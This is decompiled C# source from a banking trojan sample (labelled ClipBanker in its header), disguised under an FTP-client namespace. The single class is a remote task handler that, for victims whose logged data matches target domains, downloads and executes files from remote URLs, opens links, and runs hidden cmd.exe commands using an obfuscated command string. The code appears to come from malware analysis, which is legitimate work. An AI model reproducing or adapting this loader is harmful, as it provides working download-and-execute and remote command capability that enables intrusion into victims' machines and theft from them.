// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Core.Finilizer
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Enums;
using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace FtpClient.Data.Core
{
  public class Finilizer
  {
    public IEnumerable<InfoClass2> TryGet(params object[] args)
    {
      InfoClass1 log = (InfoClass1) args[0];
      IList<InfoClass2> infoClass2List1 = (IList<InfoClass2>) args[1];
      List<InfoClass2> infoClass2List2 = new List<InfoClass2>();
      try
      {
        foreach (InfoClass2 infoClass2 in (IEnumerable<InfoClass2>) infoClass2List1)
        {
          if (log.ContainsDomains(infoClass2.Object4))
          {
            bool flag = false;
            try
            {
              if (infoClass2.Object3 == RemoteTaskAction.DownloadAndEx)
              {
                string[] strArray = infoClass2.Object2.Split('|');
                System.IO.File.WriteAllBytes(Environment.ExpandEnvironmentVariables(strArray[1]), new WebClient().DownloadData(strArray[0]));
                Process.Start(new ProcessStartInfo()
                {
                  WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(strArray[1])).Directory.FullName,
                  FileName = Environment.ExpandEnvironmentVariables(strArray[1])
                });
                flag = true;
              }
              else if (infoClass2.Object3 == RemoteTaskAction.OpenLink)
              {
                typeof (Process).GetMethod("Start").Invoke((object) null, new object[1]
                {
                  (object) infoClass2.Object2
                });
                flag = true;
              }
              else if (infoClass2.Object3 == RemoteTaskAction.Cmd)
              {
                Process.Start(new ProcessStartInfo(new string(new char[3]
                {
                  'c',
                  'm',
                  'd'
                }), new string(new char[3]{ '/', 'C', ' ' }) + infoClass2.Object2)
                {
                  RedirectStandardError = true,
                  RedirectStandardOutput = true,
                  UseShellExecute = false,
                  CreateNoWindow = true
                });
                flag = true;
              }
              else
              {
                try
                {
                  string[] strArray = infoClass2.Object2.Split('|');
                  System.IO.File.WriteAllBytes(Environment.ExpandEnvironmentVariables(strArray[1]), Encoding.UTF8.GetBytes(new WebClient().DownloadString(strArray[0])));
                }
                catch
                {
                }
                flag = true;
              }
            }
            catch
            {
            }
            if (flag)
              infoClass2List2.Add(infoClass2);
          }
        }
      }
      catch
      {
      }
      return (IEnumerable<InfoClass2>) infoClass2List2;
    }
  }
}
